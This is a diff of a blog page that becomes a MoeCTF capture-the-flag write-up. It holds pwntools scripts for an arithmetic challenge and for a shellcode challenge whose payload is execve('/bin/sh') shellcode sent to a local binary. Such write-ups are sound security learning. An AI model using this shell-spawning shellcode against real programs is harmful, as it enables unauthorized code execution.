@@ -20,28 +20,32 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="xingkong的博客">
-<meta property="og:url" content="http://example.com/index.html">
+  <meta name="description" content="baby_calculator123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *context.log_level&#x3D;&amp;#x27;debug&amp;#x27;context.terminal&#x3D;[&amp;#x2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="moectfwp">
+<meta property="og:url" content="http://example.com/2023/11/09/moectfwp/index.html">
 <meta property="og:site_name" content="xingkong的博客">
+<meta property="og:description" content="baby_calculator123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *context.log_level&#x3D;&amp;#x27;debug&amp;#x27;context.terminal&#x3D;[&amp;#x2">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-11-09T11:27:23.000Z">
+<meta property="article:modified_time" content="2023-11-09T11:32:20.991Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://example.com/">
+<link rel="canonical" href="http://example.com/2023/11/09/moectfwp/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>xingkong的博客</title>
+  <title>moectfwp | xingkong的博客</title>
   
 
 
@@ -150,9 +154,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
@@ -168,10 +173,9 @@
       <meta itemprop="name" content="xingkong的博客">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/11/09/moectfwp/" class="post-title-link" itemprop="url">moectfwp</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          moectfwp
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -204,7 +208,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="baby-calculator"><a href="#baby-calculator" class="headerlink" title="baby_calculator"></a>baby_calculator</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;-sh&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat_the_result</span>(<span class="params">a</span>):</span><br><span class="line"></span><br><span class="line">	lst=[]</span><br><span class="line">	s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">		<span class="keyword">if</span> a[i]==<span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">			lst.append(a[i+<span class="number">1</span>:<span class="built_in">len</span>(a)-<span class="number">1</span>])</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(lst))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat_the_x</span>(<span class="params">a</span>):</span><br><span class="line"></span><br><span class="line">	lst=[]</span><br><span class="line">	s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">		<span class="keyword">if</span> a[i]==<span class="string">&#x27;:&#x27;</span> <span class="keyword">and</span> a[i+<span class="number">1</span>]&lt;=<span class="string">&#x27;9&#x27;</span> <span class="keyword">and</span> a[i+<span class="number">1</span>]&gt;=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">			lst.append(a[i+<span class="number">1</span>:<span class="built_in">len</span>(a)-<span class="number">1</span>])</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(lst))</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;192.168.23.1&#x27;</span>,<span class="number">50241</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1:&#x27;</span>,p.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;2:&#x27;</span>,p.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;3:&#x27;</span>,p.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;4:&#x27;</span>,p.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;5:&#x27;</span>,p.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;6:&#x27;</span>,p.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;7:&#x27;</span>,p.recvline())</span><br><span class="line"></span><br><span class="line">x=cat_the_x(p.recvline().decode())</span><br><span class="line">y=cat_the_x(p.recvline().decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;x:&#x27;</span>,x)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;y:&#x27;</span>,y)</span><br><span class="line">result=cat_the_result(p.recvline().decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;result:&#x27;</span>,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> x+y==result:</span><br><span class="line">	p.sendline(<span class="string">&#x27;BlackBird&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p.sendline(<span class="string">&#x27;WingS&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">99</span>):</span><br><span class="line">	x=cat_the_x(p.recvline().decode())</span><br><span class="line">	y=cat_the_x(p.recvline().decode())</span><br><span class="line">	result=cat_the_result(p.recvline().decode())</span><br><span class="line">	<span class="keyword">if</span> x+y==result:</span><br><span class="line">		p.sendline(<span class="string">&#x27;BlackBird&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.sendline(<span class="string">&#x27;WingS&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+        <h1 id="baby-calculator"><a href="#baby-calculator" class="headerlink" title="baby_calculator"></a>baby_calculator</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;-sh&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat_the_result</span>(<span class="params">a</span>):</span><br><span class="line"></span><br><span class="line">	lst=[]</span><br><span class="line">	s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">		<span class="keyword">if</span> a[i]==<span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">			lst.append(a[i+<span class="number">1</span>:<span class="built_in">len</span>(a)-<span class="number">1</span>])</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(lst))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat_the_x</span>(<span class="params">a</span>):</span><br><span class="line"></span><br><span class="line">	lst=[]</span><br><span class="line">	s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">		<span class="keyword">if</span> a[i]==<span class="string">&#x27;:&#x27;</span> <span class="keyword">and</span> a[i+<span class="number">1</span>]&lt;=<span class="string">&#x27;9&#x27;</span> <span class="keyword">and</span> a[i+<span class="number">1</span>]&gt;=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">			lst.append(a[i+<span class="number">1</span>:<span class="built_in">len</span>(a)-<span class="number">1</span>])</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(lst))</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;192.168.23.1&#x27;</span>,<span class="number">50241</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1:&#x27;</span>,p.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;2:&#x27;</span>,p.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;3:&#x27;</span>,p.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;4:&#x27;</span>,p.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;5:&#x27;</span>,p.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;6:&#x27;</span>,p.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;7:&#x27;</span>,p.recvline())</span><br><span class="line"></span><br><span class="line">x=cat_the_x(p.recvline().decode())</span><br><span class="line">y=cat_the_x(p.recvline().decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;x:&#x27;</span>,x)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;y:&#x27;</span>,y)</span><br><span class="line">result=cat_the_result(p.recvline().decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;result:&#x27;</span>,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> x+y==result:</span><br><span class="line">	p.sendline(<span class="string">&#x27;BlackBird&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p.sendline(<span class="string">&#x27;WingS&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">99</span>):</span><br><span class="line">	x=cat_the_x(p.recvline().decode())</span><br><span class="line">	y=cat_the_x(p.recvline().decode())</span><br><span class="line">	result=cat_the_result(p.recvline().decode())</span><br><span class="line">	<span class="keyword">if</span> x+y==result:</span><br><span class="line">		p.sendline(<span class="string">&#x27;BlackBird&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.sendline(<span class="string">&#x27;WingS&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <h1 id="changeable-shellcode"><a href="#changeable-shellcode" class="headerlink" title="changeable_shellcode"></a>changeable_shellcode</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your shellcode: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x28</span>uLL);</span><br><span class="line">  filter(buf, <span class="number">40</span>);</span><br><span class="line">  MEMORY[<span class="number">0x114514000</span>] = *(_QWORD *)buf;</span><br><span class="line">  MEMORY[<span class="number">0x114514008</span>] = *(_QWORD *)&amp;buf[<span class="number">8</span>];</span><br><span class="line">  MEMORY[<span class="number">0x114514010</span>] = *(_QWORD *)&amp;buf[<span class="number">16</span>];</span><br><span class="line">  MEMORY[<span class="number">0x114514018</span>] = *(_QWORD *)&amp;buf[<span class="number">24</span>];</span><br><span class="line">  MEMORY[<span class="number">0x114514020</span>] = *(_QWORD *)&amp;buf[<span class="number">32</span>];</span><br><span class="line">  JUMPOUT(<span class="number">0x114514000</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -309,194 +313,30 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rax,0x68732f2f6e69622f;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">mov rax,59;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = <span class="string">b&#x27;\x00&#x27;</span>+asm(shellcode).ljust(<span class="number">0x64</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/09/SHCTFWP/">
+        
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xingkong的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/11/09/SHCTFWP/" class="post-title-link" itemprop="url">SHCTFWP</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-11-09 19:15:20 / 修改时间：19:27:00" itemprop="dateCreated datePublished" datetime="2023-11-09T19:15:20+08:00">2023-11-09</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          
-      
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/11/09/SHCTFWP/" rel="prev" title="SHCTFWP">
+      <i class="fa fa-chevron-left"></i> SHCTFWP
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/11/%E9%87%8D%E6%B8%A9%E6%B1%87%E7%BC%96/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xingkong的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/08/11/%E9%87%8D%E6%B8%A9%E6%B1%87%E7%BC%96/" class="post-title-link" itemprop="url">重温汇编!</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-08-11 22:19:15 / 修改时间：22:20:04" itemprop="dateCreated datePublished" datetime="2023-08-11T22:19:15+08:00">2023-08-11</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Reverse/" itemprop="url" rel="index"><span itemprop="name">Reverse</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="第一章基础知识"><a href="#第一章基础知识" class="headerlink" title="第一章基础知识"></a>第一章基础知识</h1><h2 id="1-3汇编语言的组成"><a href="#1-3汇编语言的组成" class="headerlink" title="1.3汇编语言的组成"></a>1.3汇编语言的组成</h2><p>1.汇编指令，有对应的机器码</p>
-<p>2.伪指令，无对应的机器码，编译器执行，计算机不执行</p>
-<p>3其他符号，+-*&#x2F;，编译器识别，无对应机器码</p>
-<h2 id="1-5指令和数据"><a href="#1-5指令和数据" class="headerlink" title="1.5指令和数据"></a>1.5指令和数据</h2><p>应用上有区分，在内存和磁盘上无区别，例子：1000100111011000计算机可以看作大小为89D8H的数据处理，也可以看作指令mov ax，bx来执行</p>
-<h2 id="1-6存储单元"><a href="#1-6存储单元" class="headerlink" title="1.6存储单元"></a>1.6存储单元</h2><p>存储器分为好多存储单元，每个存储单元从0开始编号，计算机最小信息单位是bit，即一个二进制位，8bit组成一个Byte，就是一个字节，一个存储单元可以存一个Byte，即8个二进制位。一个存储器有多少存储单元就可以存储多少个Byte。</p>
-<p>存储器容量以字节来算，128个存储单元的存储器容量为128个字节。</p>
-<h2 id="1-7CPU对存储器的读写"><a href="#1-7CPU对存储器的读写" class="headerlink" title="1.7CPU对存储器的读写"></a>1.7CPU对存储器的读写</h2><p>CUP要进行数据读写，要先确定地址信息，再确定控制信息，然后数据信息，有三根线与CPU相连，地址线，数据线，控制线</p>
-<h2 id="1-8地址总线"><a href="#1-8地址总线" class="headerlink" title="1.8地址总线"></a>1.8地址总线</h2><p>CPU上连接的地址总线的数量决定传送多少个地址，10根总线，一共有2^10个状态，也就是说最多可以寻找2^10个内存地址。地址总线的宽度为10，就有10根线</p>
-<h2 id="1-9数据总线"><a href="#1-9数据总线" class="headerlink" title="1.9数据总线"></a>1.9数据总线</h2><p>决定数据传输速率，8根数据总线一次可以传送8位二进制数，(8位二进制数就是一个字节)</p>
-<p>16根线一次传两个字节。例子传送89D8（1000 1001 1101 1000）先用8根线传，一共16位，先传后8位即先传D8（1101 1000）再传89，而16根地址总线一次就可以传完。</p>
-<h2 id="1-10控制总线"><a href="#1-10控制总线" class="headerlink" title="1.10控制总线"></a>1.10控制总线</h2><p>作用：用于CPU对器件的控制。</p>
-<p>小结：1.汇编指令对机器指令的助记符，机器指令就是一串二进制的数，汇编指令同机器指令一一对应。</p>
-<p>2.1Byte&#x3D;8bit，1KB&#x3D;1024B(yte)</p>
-<h2 id="1-15内存地址空间"><a href="#1-15内存地址空间" class="headerlink" title="1.15内存地址空间"></a>1.15内存地址空间</h2><p>内存地址空间受地址总线的宽度限制，宽度为20，可以传从2^20个不同的地址，可以定位这么多个内存单元，有多少个内存单元就有多少内存空间，则这个内存空间大小为2^20个字节（Byte）</p>
-<p>2^20&#x2F;1024(2^10)&#x3D;2^10KB,2^10&#x2F;1024&#x3D;1MB,即这个内存地址空间的大小为1MB.</p>
-<h1 id="第二章寄存器"><a href="#第二章寄存器" class="headerlink" title="第二章寄存器"></a>第二章寄存器</h1><h2 id="2-1通用寄存器"><a href="#2-1通用寄存器" class="headerlink" title="2.1通用寄存器"></a>2.1通用寄存器</h2><p>通用寄存器AX BX CX DX，16位寄存器壳&#x3D;可以存储一个16位的数据，每一位要么是0，要么是1，共有2^16种情况，一个bit就是一个二进制位，16个二进制位就是16bit，即16位寄存器的容量是2字节（Byte），储存数据最大值为1111111111111111(B二进制),即65535(D十进制)。<br>16位寄存器可以当作两个8位寄存器使用，AX可以分为AH和AL，存储数据20000（D）即<br>100111000100000，在16位寄存器储存情况就是100111000100000，分为两个8位存储情况为：<br>先把数转为16进制4E20,然后4E放入高位寄存器AH另外放入低位寄存器。<br>高位在左，低位在右，AH：01001110(4EH) AL：00100000(20H).</p>
-<h2 id="2-2字在寄存器中的存储"><a href="#2-2字在寄存器中的存储" class="headerlink" title="2.2字在寄存器中的存储"></a>2.2字在寄存器中的存储</h2><p>字节：byte，有8个bit二进制位组成，可由一个8为寄存器存储</p>
-<p>字：由两个字节组成，分为左边高位字节，右边低位字节，一个字存在一个16位寄存器中，比如20000这个字型数据二进制表示0100 1110 0010 0000左边8位放在AH中，右边8位放在AL中，这样AX这个寄存器的内容就是0100 1110 0010 0000，既可以看作一个整体为20000，又可以两个字节型数据，大小为高位78（D十进制）低位32（D十进制）</p>
-<h2 id="2-3几条汇编指令"><a href="#2-3几条汇编指令" class="headerlink" title="2.3几条汇编指令"></a>2.3几条汇编指令</h2><p>mov 1，2     把2给1</p>
-<p>add1，2     2+1在赋值给1</p>
-<p>注意</p>
-<p>add AL,93H（AL原来为C5H）这样加完后为158H但是AL为8低位寄存器所以只能放8位二进制的数，2位16进制的数，最高位的1会丢失，所以执行完命令后AL位58H.这个1并不会存储在AH中，若指令为add AX,93H(AX原来为00C5H)则执行完后AX为0158H,</p>
-<p>进行寄存器之间的数据交换，要位数对应以下错误指令</p>
-<p>mov ax,bl</p>
-<p>mov bh,ax</p>
-<p>mov al,20000(al8位，而20000化作二进制是16位，8位寄存器可以放的二进制数是11111111，对应十进制的255)。</p>
-<p>mov al,100H(放不下啊，这种直接不执行，并不会舍去1把AL的值变为00H)</p>
-<h2 id="2-4物理地址"><a href="#2-4物理地址" class="headerlink" title="2.4物理地址"></a>2.4物理地址</h2><p>CPU访问内存单元要先获取这个内存单元的地址，所有内存单元构成的内存空间是一个一维线性空间，每个内存单元在这里都有一个唯一地址称作物理地址。</p>
-<h2 id="2-6给出物理地址的方法"><a href="#2-6给出物理地址的方法" class="headerlink" title="2.6给出物理地址的方法"></a>2.6给出物理地址的方法</h2><p>20位地址总线，2^20个状态，可以找到2^20个地址，一个地址对应一个内存单元，共2^20个内存单元，一个内存单元存一个字节（Byte）所以2^20个内存单元的容量位2^20B，2^10KB,1MB.所以20位地址总线的寻址能力是1MB.</p>
-<p>CPU大多是16位不浪费寻址能力，我们就采用两个16位的地址进行某个操作后变成20位的地址（这里的多少位全部指的是二进制的位数），先找到一个段地址，在找到一个偏移地址，那么</p>
-<p>物理地址&#x3D;段地址*16(16进制数乘以16就相当于10进制数乘以10，会加一位)+偏移地址</p>
-<p>例子，访问地址为123C8H的内存单元，取段地址为1230H，偏移地址为00C8H，然后1230H*16&#x3D;12300H,12300H+00C8H&#x3D;123C8H.</p>
-<h2 id="2-8段的概念"><a href="#2-8段的概念" class="headerlink" title="2.8段的概念"></a>2.8段的概念</h2><p>内存连续，并未分开，但是我们可以采用分段的方式管理内存，比如有一个内存空间,地址是从10000H~100FFH,我们可以认为地址从10000H到1007FH组成一个段，段地址为1000H，大小80H.即80H个内存单元128（D）个内存单元，大小128B</p>
-<p>16位的寻址能力是2^16个地址，对应容量是2^16B,2^16&#x2F;1024&#x3D;2^6&#x3D;64KB,所以一个段的长度最大为64KB.</p>
-<p>CPU寻址范围100000H~1FFFFH</p>
-<h2 id="2-9段寄存器"><a href="#2-9段寄存器" class="headerlink" title="2.9段寄存器"></a>2.9段寄存器</h2><p>存储段地址</p>
-<h2 id="2-10CS-IP"><a href="#2-10CS-IP" class="headerlink" title="2.10CS IP"></a>2.10CS IP</h2><p>CPU读取的地址为CS*16+IP</p>
-<h2 id="2-11修改CS-IP指令"><a href="#2-11修改CS-IP指令" class="headerlink" title="2.11修改CS IP指令"></a>2.11修改CS IP指令</h2><p>jmp ax；修改ip的值，含义上好比mov IP,ax</p>
-<p>jmp 3:01B6含义mov CS,3        mov IP,01B6</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
   
 
 
@@ -549,6 +389,7 @@
 
